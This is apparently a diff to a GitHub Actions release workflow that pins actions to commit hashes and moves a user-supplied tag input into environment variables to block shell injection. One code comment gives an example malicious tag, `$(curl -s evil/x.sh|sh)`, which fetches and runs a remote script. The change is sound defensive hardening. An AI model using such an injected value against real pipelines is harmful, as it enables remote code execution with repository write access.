@@ -71,7 +71,7 @@ jobs:
         run: brew install pkg-config
 
       - name: Install Rust toolchain
-        uses: dtolnay/rust-toolchain@stable
+        uses: dtolnay/rust-toolchain@4cda84d5c5c54efe2404f9d843567869ab1699d4 # stable
         with:
           targets: ${{ matrix.target }}
 
@@ -89,7 +89,7 @@ jobs:
           EOF
 
       - name: Cargo build cache
-        uses: Swatinem/rust-cache@v2
+        uses: Swatinem/rust-cache@e18b497796c12c097a38f9edb9d0641fb99eee32 # v2
         with:
           shared-key: release-${{ matrix.target }}
 
@@ -174,15 +174,23 @@ jobs:
 
       - name: Resolve tag
         id: tag
+        env:
+          # Pass the workflow_dispatch input through the environment rather than
+          # interpolating it into the script. Direct ${{ }} interpolation splices
+          # attacker-controlled text into bash in a job that holds
+          # `contents: write`, so a tag like `$(curl -s evil/x.sh|sh)` — or one
+          # containing a newline — would execute or forge step outputs.
+          TAG_INPUT: ${{ github.event.inputs.tag }}
+          EVENT_NAME: ${{ github.event_name }}
         run: |
-          if [ "${{ github.event_name }}" = "push" ]; then
+          if [ "$EVENT_NAME" = "push" ]; then
             echo "tag=${GITHUB_REF#refs/tags/}" >> "$GITHUB_OUTPUT"
           else
-            echo "tag=${{ github.event.inputs.tag }}" >> "$GITHUB_OUTPUT"
+            echo "tag=$TAG_INPUT" >> "$GITHUB_OUTPUT"
           fi
 
       - name: Create / update Release
-        uses: softprops/action-gh-release@v2
+        uses: softprops/action-gh-release@3bb12739c298aeb8a4eeaf626c5b8d85266b0e65 # v2
         with:
           tag_name: ${{ steps.tag.outputs.tag }}
           generate_release_notes: true
